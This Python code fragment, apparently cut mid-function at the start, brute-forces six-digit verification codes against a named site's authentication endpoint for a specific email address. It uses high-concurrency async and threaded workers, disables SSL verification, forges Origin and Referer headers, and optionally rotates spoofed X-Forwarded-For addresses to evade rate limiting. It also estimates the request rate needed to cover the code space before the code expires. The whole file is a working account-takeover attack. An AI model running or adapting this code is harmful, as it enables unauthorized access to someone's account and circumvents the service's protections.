    try:

        aiohttp = None
    url = kwargs.get("url", "https://duskyr.com/api/auth/verify")
    email = kwargs.get("email", "vfdeals01@uberip.com")
    concurrency = int(kwargs.get("concurrency", 150))

    start = int(kwargs.get("start", 0))
    dry_run = bool(kwargs.get("dry_run", False))
    timeout_s = float(kwargs.get("timeout_s", 8))
    if dry_run or aiohttp is None:
        return str({"mode": "dry", "aiohttp_available": aiohttp is not None, "plan": f"{count} codes from {start} at {concurrency} workers", "body_template": {"email": email, "code": "%06d"}})
    codes = [f"{start + i:06d}" for i in range(count)]
    found = []
    stats = {"200": 0, "429": 0, "403": 0, "400": 0, "other": 0, "errors": 0}
    lock = asyncio.Lock()
    idx = [0]
    t0 = time.time()
    async def worker(session, sem):
        while True:
            async with sem:
                async with lock:
                    if idx[0] >= len(codes) or found:
                        return
                    code = codes[idx[0]]
                    idx[0] += 1
                body = {"email": email, "code": code}
                try:
                    async with session.post(url, json=body, timeout=aiohttp.ClientTimeout(total=timeout_s)) as resp:
                        st = resp.status
                        key = str(st)
                        if key in stats:
                            stats[key] += 1
                        else:
                            stats["other"] += 1
                        if st == 200:
                            txt = await resp.text()
                            async with lock:
                                found.append({"code": code, "status": st, "body": txt[:300]})
                        elif st == 429:
                            txt = await resp.text()
                            async with lock:
                                if len(found) < 3:
                                    found.append({"marker": "429-sample", "body": txt[:200]})
                            await asyncio.sleep(1.0)
                except Exception:
                    stats["errors"] += 1
    async def main():
        sem = asyncio.Semaphore(concurrency)
        conn = aiohttp.TCPConnector(limit=concurrency, ssl=False)
        async with aiohttp.ClientSession(connector=conn, headers={"Origin": "https://duskyr.com", "Referer": "https://duskyr.com/", "Content-Type": "application/json"}) as session:
            tasks = [asyncio.create_task(worker(session, sem)) for _ in range(concurrency)]
            await asyncio.gather(*tasks)
    asyncio.run(main())
    dt = time.time() - t0
    return str({"codes_tried": idx[0], "elapsed_s": round(dt, 2), "rps": round(idx[0]/dt, 1) if dt else 0, "status_histogram": stats, "hits": found[:5], "space_note": "900k full coverage needs ~1500 rps within 600s TTL"})

def run(**kwargs):
    import urllib.request, urllib.error, json as _json, time
    from concurrent.futures import ThreadPoolExecutor, as_completed
    url = kwargs.get("url", "https://duskyr.com/api/auth/verify")
    email = kwargs.get("email", "vfdeals01@uberip.com")
    concurrency = int(kwargs.get("concurrency", 40))
    count = int(kwargs.get("count", 60))
    start = int(kwargs.get("start", 0))
    rotate_xff = bool(kwargs.get("rotate_xff", False))
    timeout_s = float(kwargs.get("timeout_s", 8))
    stop_on_429 = bool(kwargs.get("stop_on_429", True))
    codes = [f"{start + i:06d}" for i in range(count)]
    stats = {"200": 0, "400": 0, "401": 0, "403": 0, "429": 0, "5xx": 0, "err": 0}
    hits = []
    abort = [False]
    t0 = time.time()
    def attempt(code):
        if abort[0]:
            return None
        body = _json.dumps({"email": email, "code": code}).encode()
        hdrs = {"Content-Type": "application/json", "Origin": "https://duskyr.com", "Referer": "https://duskyr.com/"}
        if rotate_xff:
            ip = f"77.{13 + (int(code) % 200)}.{(int(code) * 7) % 254 + 1}.{(int(code) * 13) % 254 + 1}"
            hdrs["X-Forwarded-For"] = ip
        req = urllib.request.Request(url, data=body, headers=hdrs, method="POST")
        try:
            with urllib.request.urlopen(req, timeout=timeout_s) as r:
                st = r.status
                txt = r.read(300).decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            st = e.code
            txt = e.read(300).decode("utf-8", "replace")
        except Exception:
            stats["err"] += 1
            return None
        key = str(st) if str(st) in stats else ("5xx" if st >= 500 else str(st))
        stats[key] = stats.get(key, 0) + 1
        if st == 200:
            hits.append({"code": code, "body": txt})
        if st == 429 and stop_on_429:
            abort[0] = True
            hits.append({"marker": "429_first_seen", "after": stats})
        return st
    with ThreadPoolExecutor(max_workers=concurrency) as ex:
        list(ex.map(attempt, codes))
    dt = time.time() - t0
    return str({"codes_tried": sum(v for k, v in stats.items() if k not in ("err",)), "elapsed_s": round(dt, 2), "rps": round(count / dt, 1) if dt else 0, "status_histogram": stats, "hits": hits[:6], "note": "429-onset = codes_tried at abort; XFF rotation tested when rotate_xff=true"})
